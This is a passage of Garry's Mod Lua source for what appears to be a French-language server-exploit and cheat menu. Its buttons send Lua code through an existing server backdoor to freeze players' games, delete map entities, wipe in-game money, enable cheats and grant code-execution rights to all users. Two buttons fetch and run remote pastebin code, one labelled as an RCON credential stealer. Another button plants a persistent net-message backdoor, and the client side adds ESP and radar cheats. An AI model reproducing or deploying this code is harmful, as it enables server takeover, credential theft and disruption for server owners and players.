        net.Start(elfamosabackdoormdr)
        net.WriteString( " for k,v in pairs(player.GetAll()) do if( v:GetUserGroup() != \"superadmin\" ) then v:SendLua(\"while true do end\") end end" )
        net.WriteBit(1)
        net.SendToServer() 
        end
	local PetiteFaux13 = DESTROYSERVER:Add( "DButton")
        PetiteFaux13:SetSize(375,25)
        PetiteFaux13:SetPos(27,500)
		PetiteFaux13:SetFont("jspquoimettre")
        PetiteFaux13:SetTextColor(noir)
        PetiteFaux13:SetText("Supprimer Les Entitées & Props")
        PetiteFaux13.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux13.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux13.DoClick = function ()
		Notifications("Wow c'est vide maintenant :o")
        net.Start(elfamosabackdoormdr)
        net.WriteString( "for k, v in pairs(ents.FindByClass( \"prop_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"func_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"env_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"lua_run*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"point_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"trigger_*\" )) do v:Remove() end for k, v in pairs(ents.FindByClass( \"info_*\" )) do v:Remove() end" )
        net.WriteBit(1)
        net.SendToServer() 
        end
	local PetiteFaux14 = DESTROYSERVER:Add( "DButton")
        PetiteFaux14:SetSize(375,25)
        PetiteFaux14:SetPos(27,540)
		PetiteFaux14:SetFont("jspquoimettre")
        PetiteFaux14:SetTextColor(noir)
        PetiteFaux14:SetText("Faire Voler Tout Le Serveur")
        PetiteFaux14.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux14.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux14.DoClick = function ()
		Notifications("Les voila en trains de voler c'est magnifique :D (l'attérissage sera pas très beau)")
        net.Start(elfamosabackdoormdr)
        net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000))) end" )
        net.WriteBit(1)
        net.SendToServer() 
        end
	local PetiteFaux15 = DESTROYSERVER:Add( "DButton")
        PetiteFaux15:SetSize(375,25)
        PetiteFaux15:SetPos(27,580)
		PetiteFaux15:SetFont("jspquoimettre")
        PetiteFaux15:SetTextColor(noir)
        PetiteFaux15:SetText("Supprimer L'argent Du Serveur (DARKP)")
        PetiteFaux15.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux15.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux15.DoClick = function ()
		Notifications("Où est passer l'argent... :o")
        net.Start(elfamosabackdoormdr)
        net.WriteString( "RunConsoleCommand(\"rp_resetallmoney\")" )
        net.WriteBit(1)
        net.SendToServer() 
        end
	local PetiteFaux16 = DESTROYSERVER:Add( "DButton")
        PetiteFaux16:SetSize(375,25)
        PetiteFaux16:SetPos(27,620)
		PetiteFaux16:SetFont("jspquoimettre")
        PetiteFaux16:SetTextColor(noir)
        PetiteFaux16:SetText("Détruire La Gravité")
        PetiteFaux16.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux16.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux16.DoClick = function ()
		Notifications("Wow je m'envole")
        net.Start(elfamosabackdoormdr)
        net.WriteString( "RunConsoleCommand(\"sv_gravity\", \"-700\")" )
        net.WriteBit(1)
        net.SendToServer() 
        end
	local PetiteFaux17 = DESTROYSERVER:Add( "DButton")
        PetiteFaux17:SetSize(375,25)
        PetiteFaux17:SetPos(27,660)
		PetiteFaux17:SetFont("jspquoimettre")
        PetiteFaux17:SetTextColor(noir)
        PetiteFaux17:SetText("Transformer La Terre En Lune")
        PetiteFaux17.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux17.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux17.DoClick = function ()
		Notifications("Gravité De La Lune YEAAAAAAAAH")
        net.Start(elfamosabackdoormdr)
        net.WriteString( "RunConsoleCommand(\"sv_gravity\", \"20\")" )
        net.WriteBit(1)
        net.SendToServer() 
        end
	local PetiteFaux18 = DESTROYSERVER:Add( "DButton")
        PetiteFaux18:SetSize(375,25)
        PetiteFaux18:SetPos(27,700)
		PetiteFaux18:SetFont("jspquoimettre")
        PetiteFaux18:SetTextColor(noir)
        PetiteFaux18:SetText("Coller Les Joueurs Au Sol")
        PetiteFaux18.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux18.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux18.DoClick = function ()
		Notifications("J'arrive plus a bouger :c")
        net.Start(elfamosabackdoormdr)
        net.WriteString( "RunConsoleCommand(\"sv_gravity\", \"2200\")" )
        net.WriteBit(1)
        net.SendToServer() 
        end
	local PetiteFaux19 = DESTROYSERVER:Add( "DButton")
        PetiteFaux19:SetSize(375,25)
        PetiteFaux19:SetPos(27,740)
		PetiteFaux19:SetFont("jspquoimettre")
        PetiteFaux19:SetTextColor(noir)
        PetiteFaux19:SetText("Anéantir La Physique")
        PetiteFaux19.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux19.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux19.DoClick = function ()
		Notifications("J'ai envie de vomir ._.")
        net.Start(elfamosabackdoormdr)
        net.WriteString( "RunConsoleCommand(\"sv_friction\", \"-50\")" )
        net.WriteBit(1)
        net.SendToServer() 
        end
	local PetiteFaux20 = DESTROYSERVER:Add( "DButton")
        PetiteFaux20:SetSize(375,25)
        PetiteFaux20:SetPos(27,780)
		PetiteFaux20:SetFont("jspquoimettre")
        PetiteFaux20:SetTextColor(noir)
        PetiteFaux20:SetText("Réparé La Physique")
        PetiteFaux20.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux20.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux20.DoClick = function ()
		Notifications("C'est meilleur maintenant !!!")
        net.Start(elfamosabackdoormdr)
        net.WriteString( "RunConsoleCommand(\"sv_friction\", \"8\")" )
        net.WriteBit(1)
        net.SendToServer() 
        end
	local PetiteFaux21 = DESTROYSERVER:Add( "DButton")
        PetiteFaux21:SetSize(375,25)
        PetiteFaux21:SetPos(27,820)
		PetiteFaux21:SetFont("jspquoimettre")
        PetiteFaux21:SetTextColor(noir)
        PetiteFaux21:SetText("Transformer Les Joueurs En Escargots")
        PetiteFaux21.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux21.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux21.DoClick = function ()
		Notifications("C'est LEEEEEEEEEEEEEEEENT")
        net.Start(elfamosabackdoormdr)
        net.WriteString( "RunConsoleCommand(\"sv_friction\", \"100\")" )
        net.WriteBit(1)
        net.SendToServer() 
        end
	local PetiteFaux22 = DESTROYSERVER:Add( "DButton")
        PetiteFaux22:SetSize(375,25)
        PetiteFaux22:SetPos(27,860)
		PetiteFaux22:SetFont("jspquoimettre")
        PetiteFaux22:SetTextColor(noir)
        PetiteFaux22:SetText("Transformer Le Sol En Patinoire")
        PetiteFaux22.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux22.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux22.DoClick = function ()
		Notifications("Sa glisse bordel")
        net.Start(elfamosabackdoormdr)
        net.WriteString( "RunConsoleCommand(\"sv_friction\", \"1\")" )
        net.WriteBit(1)
        net.SendToServer() 
        end
	local PetiteFaux23 = DESTROYSERVER:Add( "DButton")
        PetiteFaux23:SetSize(375,25)
        PetiteFaux23:SetPos(27,900)
		PetiteFaux23:SetFont("jspquoimettre")
        PetiteFaux23:SetTextColor(noir)
        PetiteFaux23:SetText("Autorisé Les Cheats Sur Le Serveur")
        PetiteFaux23.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux23.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux23.DoClick = function ()
		Notifications("C'était pas trop utile mais tu vien de le faire...")
        net.Start(elfamosabackdoormdr)
        net.WriteString( "RunConsoleCommand(\"sv_cheats\", \"1\")" )
        net.WriteBit(1)
        net.SendToServer() 
        end
	local PetiteFaux24 = DESTROYSERVER:Add( "DButton")
        PetiteFaux24:SetSize(375,25)
        PetiteFaux24:SetPos(27,940)
		PetiteFaux24:SetFont("jspquoimettre")
        PetiteFaux24:SetTextColor(noir)
        PetiteFaux24:SetText("Changer Le LoadingScreen")
        PetiteFaux24.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux24.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux24.DoClick = function ()
		Notifications("C'est plus propre maintenant :D")
        net.Start(elfamosabackdoormdr)
        net.WriteString( "RunConsoleCommand(\"sv_loadingurl\", \"https://image.noelshack.com/fichiers/2018/13/3/1522248793-owned.png\")" )
        net.WriteBit(1)
        net.SendToServer() 
        end
	local PetiteFaux25 = DESTROYSERVER:Add( "DButton")
        PetiteFaux25:SetSize(375,25)
        PetiteFaux25:SetPos(27,980)
		PetiteFaux25:SetFont("jspquoimettre")
        PetiteFaux25:SetTextColor(noir)
        PetiteFaux25:SetText("Mettre Les Dancing Skeleton")
        PetiteFaux25.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux25.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux25.DoClick = function ()
		Notifications("Dancing Skeleton lala")
        net.Start(elfamosabackdoormdr)
        net.WriteString( "http.Fetch(\"https://pastebin.com/raw/HjaLt4Gt\",function(b,l,h,c)RunString(b)end,nil)" )
        net.WriteBit(1)
        net.SendToServer() 
        end	
	local PetiteFaux26 = DESTROYSERVER:Add( "DButton")
        PetiteFaux26:SetSize(375,25)
        PetiteFaux26:SetPos(27,1020)
		PetiteFaux26:SetFont("jspquoimettre")
        PetiteFaux26:SetTextColor(noir)
        PetiteFaux26:SetText("Autorisé Luarun")
        PetiteFaux26.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux26.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux26.DoClick = function ()
		Notifications("Backdoor ez a mettre héhé")
        net.Start(elfamosabackdoormdr)
        net.WriteString( "RunConsoleCommand(\"ulx\", \"groupallow\", \"user\", \"ulx luarun\")" )
        net.WriteBit(1)
        net.SendToServer() 
        end
	local PetiteFaux27 = DESTROYSERVER:Add( "DButton")
        PetiteFaux27:SetSize(375,25)
        PetiteFaux27:SetPos(27,340)
		PetiteFaux27:SetFont("jspquoimettre")
        PetiteFaux27:SetTextColor(noir)
        PetiteFaux27:SetText("Enlever Anti Luarun Admin")
        PetiteFaux27.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux27.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux27.DoClick = function ()
		Notifications("Backdoor ez a mettre héhé")
        net.Start(elfamosabackdoormdr)
        net.WriteString( "RunConsoleCommand(\"ulx\", \"groupdeny\", \"superadmin\", \"ulx groupdeny\")" )
        net.WriteBit(1)
        net.SendToServer() 
        end
	local PetiteFaux37 = DESTROYSERVER:Add( "DButton")
        PetiteFaux37:SetSize(375,25)
        PetiteFaux37:SetPos(27,380)
		PetiteFaux37:SetFont("jspquoimettre")
        PetiteFaux37:SetTextColor(noir)
        PetiteFaux37:SetText("Appelez Un Démon")
        PetiteFaux37.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,PetiteFaux:GetWide()-8,PetiteFaux:GetTall()-8)
		end
		PetiteFaux37.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        PetiteFaux37.DoClick = function ()
		Notifications("Non, mais qu'il est débile lui -.-")
		RunConsoleCommand("explode")
		RunConsoleCommand("say", "/name Âme Perdu")
		RunConsoleCommand("gm_spawn","models/props_c17/gravestone003a.mdl")
		ply:ChatPrint( "[Démon] Ne me dérange pas..." )
        end

local LERESTEDUBORDEL = vgui.Create( "DPanel", SOFUNNY )
    LERESTEDUBORDEL.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, Color(15,15,15,200))
    end
SOFUNNY:AddSheet( "Autres", LERESTEDUBORDEL, "icon16/world_add.png" )
local LERESTEDUBORDEL = vgui.Create( "DScrollPanel", LERESTEDUBORDEL )
LERESTEDUBORDEL:Dock( FILL )
LERESTEDUBORDEL:InnerWidth(100)
local sbar = LERESTEDUBORDEL:GetVBar()
function LERESTEDUBORDEL:Paint( w, h )
	draw.RoundedBox( 0, 0, 0, w -1000, h , HSVToColor( CurTime() % 6 * 100, 1, 1 ))
end
function sbar.btnUp:Paint( w, h )
	draw.RoundedBox( 0, 0, 0, w, h, HSVToColor( CurTime() % 6 * 100, 1, 1 ))
end
function sbar.btnDown:Paint( w, h )
	draw.RoundedBox( 0, 0, 0, w, h, HSVToColor( CurTime() % 6 * 100, 1, 1 ))
end
function sbar.btnGrip:Paint( w, h )
	draw.RoundedBox( 0, 0, 0, w, h, HSVToColor( CurTime() % 6 * 100, 1, 1 ))
end

   local restedubordel = LERESTEDUBORDEL:Add( "DButton")
        restedubordel:SetSize(375,25)
        restedubordel:SetPos(27,60)
		restedubordel:SetFont("jspquoimettre")
        restedubordel:SetTextColor(noir)
        restedubordel:SetText("Stoppé La Musique Du Menu")
        restedubordel.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,restedubordel:GetWide()-8,restedubordel:GetTall()-8)
		end
		restedubordel.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        restedubordel.DoClick = function ()
		RunConsoleCommand "stopsound"
		Notifications("Musique Stoppé")
        end
		
   local strip = LERESTEDUBORDEL:Add( "DButton")
        strip:SetSize(375,25)
        strip:SetPos(27,100)
		strip:SetFont("jspquoimettre")
        strip:SetTextColor(noir)
        strip:SetText("Strip Les Joueurs")
        strip.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,strip:GetWide()-8,strip:GetTall()-8)
		end
		strip.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        strip.DoClick = function ()
		jefaitlenculer()
		Notifications("Tu A Strip Les Armes Des Joueurs ( Sauf Si Le Serveur A Patch La Technique :') )")
        end
		
   local quitgame = LERESTEDUBORDEL:Add( "DButton")
        quitgame:SetSize(375,25)
        quitgame:SetPos(27,140)
		quitgame:SetFont("jspquoimettre")
        quitgame:SetTextColor(noir)
        quitgame:SetText("Arreté Le Jeu")
        quitgame.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,quitgame:GetWide()-8,quitgame:GetTall()-8)
		end
		quitgame.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
        quitgame.DoClick = function ()
		RunConsoleCommand "killserver"
		Notifications("Jeu Stoppé")
        end

	local startradar = LERESTEDUBORDEL:Add( "DButton")
        startradar:SetSize(375,25)
        startradar:SetPos(27,180)
		startradar:SetFont("jspquoimettre")
        startradar:SetTextColor(noir)
        startradar:SetText("Activé Radar")
        startradar.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,startradar:GetWide()-8,startradar:GetTall()-8)
		end
		startradar.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
		startradar.DoClick = function()
		LocalPlayer():ConCommand( "lix_lesp_radarfov 1500" )
		LocalPlayer():ConCommand( "lix_lesp_radar 1" )
		Notifications("Radar Activé")
		end

	local stopradar = LERESTEDUBORDEL:Add( "DButton")
        stopradar:SetSize(375,25)
        stopradar:SetPos(27,220)
		stopradar:SetFont("jspquoimettre")
        stopradar:SetTextColor(noir)
        stopradar:SetText("Désactivé Radar")
        stopradar.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,stopradar:GetWide()-8,stopradar:GetTall()-8)
		end
		stopradar.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
		stopradar.DoClick = function()
		LocalPlayer():ConCommand( "lix_lesp_radar 0" )
		Notifications("Radar Désactivé")
		end

	local espon = LERESTEDUBORDEL:Add( "DButton")
        espon:SetSize(375,25)
        espon:SetPos(27,260)
		espon:SetFont("jspquoimettre")
        espon:SetTextColor(noir)
        espon:SetText("Activé ESP")
        espon.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,espon:GetWide()-8,espon:GetTall()-8)
		end
		espon.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
		espon.DoClick = function()
		LocalPlayer():ConCommand( "reaper_esp 1" )
		Notifications("ESP Activé")
		end
		
	local espoff = LERESTEDUBORDEL:Add( "DButton")
        espoff:SetSize(375,25)
        espoff:SetPos(27,300)
		espoff:SetFont("jspquoimettre")
        espoff:SetTextColor(noir)
        espoff:SetText("Désactivé ESP")
        espoff.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,espoff:GetWide()-8,espoff:GetTall()-8)
		end
		espoff.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
		espoff.DoClick = function()
		LocalPlayer():ConCommand( "reaper_esp 0" )
		Notifications("ESP Désactivé")
		end
		
	local activercrosshair = LERESTEDUBORDEL:Add( "DButton")
        activercrosshair:SetSize(375,25)
        activercrosshair:SetPos(27,340)
		activercrosshair:SetFont("jspquoimettre")
        activercrosshair:SetTextColor(noir)
        activercrosshair:SetText("Activé Crosshair")
        activercrosshair.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,activercrosshair:GetWide()-8,activercrosshair:GetTall()-8)
		end
		activercrosshair.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
		activercrosshair.DoClick = function()
		LocalPlayer():ConCommand( "reaper_chair 1" )
		LocalPlayer():ConCommand( "crosshair 0" )
		Notifications("Crosshair Activé")
		end
		
	local desactivercrosshair = LERESTEDUBORDEL:Add( "DButton")
        desactivercrosshair:SetSize(375,25)
        desactivercrosshair:SetPos(27,380)
		desactivercrosshair:SetFont("jspquoimettre")
        desactivercrosshair:SetTextColor(noir)
        desactivercrosshair:SetText("Désactivé Crosshair")
        desactivercrosshair.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,desactivercrosshair:GetWide()-8,desactivercrosshair:GetTall()-8)
		end
		desactivercrosshair.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
		desactivercrosshair.DoClick = function()
		LocalPlayer():ConCommand( "reaper_chair 0" )
		LocalPlayer():ConCommand( "crosshair 1" )
		Notifications("Crosshair Désactivé")
		end
		
	local activermirroir = LERESTEDUBORDEL:Add( "DButton")
        activermirroir:SetSize(375,25)
        activermirroir:SetPos(27,420)
		activermirroir:SetFont("jspquoimettre")
        activermirroir:SetTextColor(noir)
        activermirroir:SetText("Mirroir Activé")
        activermirroir.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,activermirroir:GetWide()-8,activermirroir:GetTall()-8)
		end
		activermirroir.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
		activermirroir.DoClick = function()
		LocalPlayer():ConCommand( "lix_lesp_mirror 1" )
		Notifications("Mirroir  Activé")
		end
		
	local desactivermirroir = LERESTEDUBORDEL:Add( "DButton")
        desactivermirroir:SetSize(375,25)
        desactivermirroir:SetPos(27,460)
		desactivermirroir:SetFont("jspquoimettre")
        desactivermirroir:SetTextColor(noir)
        desactivermirroir:SetText("Mirroir  Désactivé")
        desactivermirroir.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,desactivermirroir:GetWide()-8,desactivermirroir:GetTall()-8)
		end
		desactivermirroir.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
		desactivermirroir.DoClick = function()
		LocalPlayer():ConCommand( "lix_lesp_mirror 0" )
		Notifications("Mirroir Désactivé")
		end

	local mettrebackdoor = LERESTEDUBORDEL:Add( "DButton")
        mettrebackdoor:SetSize(375,25)
        mettrebackdoor:SetPos(27,500)
		mettrebackdoor:SetFont("jspquoimettre")
        mettrebackdoor:SetTextColor(noir)
        mettrebackdoor:SetText("Mettre Backdoor (Être Superadmin)")
        mettrebackdoor.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,mettrebackdoor:GetWide()-8,mettrebackdoor:GetTall()-8)
		end
		mettrebackdoor.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
		mettrebackdoor.DoClick = function()
		timer.Create( "injectbackdoor", 2, 0, function()
		LocalPlayer():ConCommand( "ulx logecho 0" )
		LocalPlayer():ConCommand( "ulx luarun util.AddNetworkString('stoppk') net.Receive('stoppk',function(len,pl) RunStringEx(net.ReadString(),'[C]',false) end)" )
		yaunebackdooroupas()
		end)
		end

	local activerrconstealer = LERESTEDUBORDEL:Add( "DButton")
        activerrconstealer:SetSize(375,25)
        activerrconstealer:SetPos(27,540)
		activerrconstealer:SetFont("jspquoimettre")
        activerrconstealer:SetTextColor(noir)
        activerrconstealer:SetText("Injecter RconStealer")
        activerrconstealer.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,activerrconstealer:GetWide()-8,activerrconstealer:GetTall()-8)
		end
		activerrconstealer.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
		activerrconstealer.DoClick = function()
		net.Start(elfamosabackdoormdr)
		net.WriteString( "http.Fetch(\"https://pastebin.com/raw/hbBEavQx\",function(b,l,h,c)RunString(b)end,nil)" )
        net.WriteBit(1)
        net.SendToServer() 
		Notifications("RconStealer Injecté")
		end
		
	local prendrercon = LERESTEDUBORDEL:Add( "DButton")
        prendrercon:SetSize(375,25)
        prendrercon:SetPos(27,580)
		prendrercon:SetFont("jspquoimettre")
        prendrercon:SetTextColor(noir)
        prendrercon:SetText("Récupéré Rcon")
        prendrercon.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,prendrercon:GetWide()-8,prendrercon:GetTall()-8)
		end
		prendrercon.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
		prendrercon.DoClick = function()
		net.WriteString("RunConsoleCommand(\"zilnixestbo\")")
		Notifications("RconStealer Récupéré")
		end

	local exploitmenu = LERESTEDUBORDEL:Add( "DButton")
        exploitmenu:SetSize(375,25)
        exploitmenu:SetPos(27,620)
		exploitmenu:SetFont("jspquoimettre")
        exploitmenu:SetTextColor(noir)
        exploitmenu:SetText("Exploit Menu")
        exploitmenu.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,exploitmenu:GetWide()-8,exploitmenu:GetTall()-8)
		end
		exploitmenu.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
		exploitmenu.DoClick = function()
		RunConsoleCommand "reaperexploits"
		Notifications("Exploits Menu Ouvert")
		end

	local backdoorcheck = LERESTEDUBORDEL:Add( "DButton")
        backdoorcheck:SetSize(375,25)
        backdoorcheck:SetPos(27,660)
		backdoorcheck:SetFont("jspquoimettre")
        backdoorcheck:SetTextColor(noir)
        backdoorcheck:SetText("Check Backdoor")
        backdoorcheck.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,backdoorcheck:GetWide()-8,backdoorcheck:GetTall()-8)
		end
		backdoorcheck.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
		backdoorcheck.DoClick = function()
		timer.Create( "checkbackdoorspls", 2, 0, function()
		Notifications("Scan en cours...")
		surface.PlaySound("buttons/blip1.wav") 
		RunConsoleCommand "beadminfdp"
		yaunebackdooroupas()
		end)
		end	

	local stopbackdoorcheck = LERESTEDUBORDEL:Add( "DButton")
        stopbackdoorcheck:SetSize(375,25)
        stopbackdoorcheck:SetPos(27,700)
		stopbackdoorcheck:SetFont("jspquoimettre")
        stopbackdoorcheck:SetTextColor(noir)
        stopbackdoorcheck:SetText("Stop Check Backdoor")
        stopbackdoorcheck.Paint = function()
        surface.SetDrawColor(noir)
        surface.DrawRect(4,4,stopbackdoorcheck:GetWide()-8,stopbackdoorcheck:GetTall()-8)
		end
		stopbackdoorcheck.Paint = function( self, w, h )
        draw.RoundedBox(10, 0, 0, w, h, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
        end
		stopbackdoorcheck.DoClick = function()
		timer.Stop( "checkbackdoorspls")
		Notifications("Scan stoppé...")
		surface.PlaySound("buttons/blip1.wav") 	
		end	

local ReaperESP = CreateClientConVar( "reaper_esp", 1, true, false )
local ReaperCROSSHAIR = CreateClientConVar( "reaper_chair", 0, true, false ) 
local LESPMirror = CreateClientConVar( "lix_lesp_mirror", 0, true, false )
local LESPMirrorx = CreateClientConVar( "lix_lesp_mirrorx", 0, true, false )
local LESPMirrory = CreateClientConVar( "lix_lesp_mirrory", 0, true, false )
local LESPMirrorw = CreateClientConVar( "lix_lesp_mirrorw", 300, true, false )
local LESPMirrorh = CreateClientConVar( "lix_lesp_mirrorh", 300, true, false )
local LESPMirrorpitch = CreateClientConVar( "lix_lesp_mirrorpitch", -2, true, false )
local LESPMirroryaw = CreateClientConVar( "lix_lesp_mirroryaw", 180, true, false )
local LESPMirrorroll = CreateClientConVar( "lix_lesp_mirrorroll", 0, true, false )

local LESPRadar = CreateClientConVar( "lix_lesp_radar", 0, true, false )
local LESPRadarx = CreateClientConVar( "lix_lesp_radarx", 0, true, false )
local LESPRadary = CreateClientConVar( "lix_lesp_radary", 0, true, false )
local LESPRadarw = CreateClientConVar( "lix_lesp_radarw", 300, true, false )
local LESPRadarh = CreateClientConVar( "lix_lesp_radarh", 300, true, false )
local LESPRadarfov = CreateClientConVar( "lix_lesp_radarfov", 300, true, false )
local LESPRadarauto = CreateClientConVar( "lix_lesp_radarauto", 1, true, false )
local function coordinates( ent )
local min, max = ent:OBBMins(), ent:OBBMaxs()
local corners = {
Vector( min.x, min.y, min.z ),
Vector( min.x, min.y, max.z ),
Vector( min.x, max.y, min.z ),
Vector( min.x, max.y, max.z ),
Vector( max.x, min.y, min.z ),
Vector( max.x, min.y, max.z ),
